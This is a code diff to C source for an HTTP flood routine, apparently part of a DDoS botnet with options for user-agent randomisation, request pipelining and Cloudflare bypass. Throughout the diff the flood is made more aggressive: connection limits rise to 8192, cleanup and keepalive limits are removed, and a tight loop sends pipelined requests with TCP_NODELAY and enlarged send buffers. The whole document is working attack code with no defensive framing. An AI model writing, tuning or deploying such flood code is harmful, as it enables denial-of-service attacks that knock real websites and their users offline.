@@ -11,13 +11,14 @@
 #include <sys/socket.h>
 #include <sys/epoll.h>
 #include <arpa/inet.h>
+#include <netinet/tcp.h>
 
 #include "http_method.h"
 #include "http_common.h"
 #include "../headers/protocol.h"
 #include "../headers/attack_core.h"
 
-#define MAX_CONNECTIONS 512
+#define MAX_CONNECTIONS 8192
 #define MAX_REQUEST_SIZE 4096
 #define MAX_PIPELINE_DEPTH 10
 
@@ -128,8 +129,6 @@ static int build_http_request(char* buf, size_t buf_size, const http_request_opt
 typedef struct {
     int fd;
     uint8_t state;
-    time_t created;
-    int requests_sent;
 } http_conn_t;
 
 static void* http_flood(attack_params* params) {
@@ -138,9 +137,6 @@ static void* http_flood(attack_params* params) {
 
     http_conn_t* conns = (http_conn_t*)calloc(max_conns, sizeof(http_conn_t));
     if (!conns) return NULL;
-
-    struct pollfd* pfds = (struct pollfd*)malloc(max_conns * sizeof(struct pollfd));
-    if (!pfds) { free(conns); return NULL; }
 
     struct sockaddr_in target;
     memcpy(&target, &params->target_addr, sizeof(target));
@@ -151,7 +147,6 @@ static void* http_flood(attack_params* params) {
     attack_option* cookie_opt = find_option(params, OPT_COOKIE);
     attack_option* referer_opt = find_option(params, OPT_REFERER);
     attack_option* postdata_opt = find_option(params, OPT_POSTDATA);
-    attack_option* keepalive_opt = find_option(params, OPT_KEEPALIVE);
     attack_option* pipeline_opt = find_option(params, OPT_PIPELINE);
     attack_option* uarand_opt = find_option(params, OPT_UARAND);
     attack_option* method_opt = find_option(params, OPT_METHOD);
@@ -232,7 +227,6 @@ static void* http_flood(attack_params* params) {
         .is_cfbypass = is_cfbypass,
     };
 
-    int keepalive = keepalive_opt ? get_option_u8(keepalive_opt) : 1;
     int pipeline_depth = pipeline_opt ? get_option_u8(pipeline_opt) : 0;
     if (pipeline_depth > MAX_PIPELINE_DEPTH) pipeline_depth = MAX_PIPELINE_DEPTH;
     
@@ -241,7 +235,6 @@ static void* http_flood(attack_params* params) {
     if (!request || !discard) {
         if (request) free(request);
         if (discard) free(discard);
-        free(pfds);
         free(conns);
         return NULL;
     }
@@ -266,115 +259,54 @@ static void* http_flood(attack_params* params) {
     }
     
     time_t end_time = time(NULL) + params->duration;
-    struct timeval last_cleanup = {0, 0};
-    
+    int sndbuf = 262144;
+    int nodelay = 1;
+
     attack_rand_init();
-    
+
     while (params->active && time(NULL) < end_time) {
+        if (total_pipe_len <= 0) break;
+
         for (int i = 0; i < max_conns && params->active; i++) {
             if (conns[i].fd <= 0) {
                 int fd = socket(AF_INET, SOCK_STREAM, 0);
                 if (fd < 0) continue;
-                
+
+                setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));
+                setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                 http_set_nonblocking(fd);
-                
+
                 int ret = connect(fd, (struct sockaddr*)&target, sizeof(target));
                 if (ret < 0 && errno != EINPROGRESS) {
                     close(fd);
                     continue;
                 }
-                
+
                 conns[i].fd = fd;
                 conns[i].state = 1;
-                conns[i].created = time(NULL);
-                conns[i].requests_sent = 0;
             }
         }
 
-        int nfds = 0;
-        int poll_map[MAX_CONNECTIONS];
-        for (int i = 0; i < max_conns; i++) {
-            if (conns[i].fd > 0) {
-                pfds[nfds].fd = conns[i].fd;
-                pfds[nfds].events = POLLOUT;
-                pfds[nfds].revents = 0;
-                poll_map[nfds] = i;
-                nfds++;
-            }
-        }
-
-        if (nfds > 0) {
-            poll(pfds, nfds, 5);
-        }
-        
-        for (int j = 0; j < nfds && params->active; j++) {
-            int i = poll_map[j];
+        for (int i = 0; i < max_conns && params->active; i++) {
             if (conns[i].fd <= 0) continue;
 
-            if (pfds[j].revents & (POLLERR | POLLHUP | POLLNVAL)) {
-                close(conns[i].fd);
-                conns[i].fd = 0;
-                conns[i].state = 0;
-                continue;
-            }
-
-            if (!(pfds[j].revents & POLLOUT)) continue;
-
-            if (conns[i].state == 1) {
-                int error = 0;
-                socklen_t elen = sizeof(error);
-                getsockopt(conns[i].fd, SOL_SOCKET, SO_ERROR, &error, &elen);
-                if (error != 0) {
-                    close(conns[i].fd);
-                    conns[i].fd = 0;
-                    conns[i].state = 0;
-                    continue;
-                }
-                conns[i].state = 2;
-            }
-
-            if (j % 5 == 0) {
+            for (int k = 0; k < 256; k++) {
                 randomize_placeholders(request, pipe_offsets, pipe_off_cnt);
-            }
-
-            if (total_pipe_len <= 0) continue;
-            
-            ssize_t sent = send(conns[i].fd, request, total_pipe_len, MSG_NOSIGNAL | MSG_DONTWAIT);
-            
-            if (sent <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                close(conns[i].fd);
-                conns[i].fd = 0;
-                conns[i].state = 0;
-                continue;
-            }
-            
-            if (sent > 0) {
-                conns[i].requests_sent += num_reqs;
-            }
-            
-            recv(conns[i].fd, discard, sizeof(discard), MSG_DONTWAIT);
-            
-            if (!keepalive || conns[i].requests_sent > 200) {
-                close(conns[i].fd);
-                conns[i].fd = 0;
-                conns[i].state = 0;
-            }
-        }
-        
-        struct timeval now;
-        gettimeofday(&now, NULL);
-        if (now.tv_sec - last_cleanup.tv_sec >= 1) {
-            for (int i = 0; i < max_conns; i++) {
-                if (conns[i].fd <= 0) continue;
-                
-                time_t conn_age = time(NULL) - conns[i].created;
-                if (conn_age > 10) {
+                ssize_t sent = send(conns[i].fd, request, total_pipe_len, MSG_NOSIGNAL | MSG_DONTWAIT);
+                if (sent > 0) continue;
+                if (sent < 0) {
+                    if (errno == EAGAIN || errno == EWOULDBLOCK) break;
+                    if (errno == EINPROGRESS || errno == ENOTCONN) break;
                     close(conns[i].fd);
                     conns[i].fd = 0;
                     conns[i].state = 0;
                 }
+                break;
             }
-            last_cleanup = now;
+
+            if (conns[i].fd > 0) {
+                recv(conns[i].fd, discard, 4096, MSG_DONTWAIT);
+            }
         }
     }
     
@@ -385,7 +317,6 @@ static void* http_flood(attack_params* params) {
     }
     free(request);
     free(discard);
-    free(pfds);
     free(conns);
     
     return NULL;
